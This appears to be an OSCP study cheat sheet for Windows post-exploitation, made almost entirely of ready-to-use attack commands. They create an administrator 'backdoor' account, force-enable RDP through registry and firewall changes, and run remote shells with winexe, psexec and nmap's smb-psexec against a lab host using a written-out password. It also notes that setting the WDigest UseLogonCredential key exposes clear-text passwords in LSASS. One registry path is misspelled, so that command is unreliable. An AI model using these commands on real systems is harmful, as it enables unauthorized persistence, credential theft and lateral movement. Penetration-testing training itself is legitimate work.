OSCP - Windows Post Exploitation
Backdoor User

net user backdoor backdoor123 /add
net localgroup administrators backdoor /add
net localgroup "Remote Desktop Users" backdoor /add

Enabling RDP

netsh firewall set service RemoteDesktop enable

reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurentControlSet\Control\Terminal Server" /v fDenyTSConnections /t
REG_DWORD /d 0 /f
reg add "hklm\system\currentControlSet\Control\Terminal Server" /v "AllowTSConnections" /t REG_DWORD /d 0x1 /f

sc config TermService start= auto
net start Termservice
netsh.exe
firewall
add portopening TCP 3389 "Remote Desktop"

OR:

netsh.exe advfirewall firewall add rule name="Remote Desktop - User Mode (TCP-In)" dir=in action=allow
program="%%SystemRoot%%\system32\svchost.exe" service="TermService" description="Inbound rule for the
Remote Desktop service to allow RDP traffic. [TCP 3389] added by LogicDaemon's script" enable=yes
profile=private,domain localport=3389 protocol=tcp

netsh.exe advfirewall firewall add rule name="Remote Desktop - User Mode (UDP-In)" dir=in action=allow
program="%%SystemRoot%%\system32\svchost.exe" service="TermService" description="Inbound rule for the
Remote Desktop service to allow RDP traffic. [UDP 3389] added by LogicDaemon's script" enable=yes
profile=private,domain localport=3389 protocol=udp

OR (meterpreter)

run post/windows/manage/enable_rdp

https://www.offensive-security.com/metasploit-unleashed/enabling-remote-desktop/
Dumping Credentials
https://adsecurity.org/?page_id=1821
in order to prevent the “clear-text” password from being placed in LSASS, the following registry key needs to be set to “0” (Digest Disabled):

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest “UseLogonCredential”(DWORD)

This registry key is worth monitoring in your environment since an attacker may wish to set it to 1 to enable Digest password support which forces “clear-text” passwords to be placed in LSASS on any version of Windows from Windows 7/2008R2 up to Windows 10/2012R2. Windows 8.1/2012 R2 and newer do not have a “UseLogonCredential” DWORD value, so it would have to be created. The existence of this key on these systems may indicate a problem.
Remote Commands

winexe --user=backdoor%laKK195@19z  //10.11.1.218 ipconfig

winexe --user=backdoor%laKK195@19z --system //10.11.1.218 cmd

OR

psexec (from Windows)

OR

nmap -sU -sS --script smb-psexec.nse --script-args=smbuser=<username>,smbpass=<password>[,config=<config>] -p U:137,T:139 <host>

a
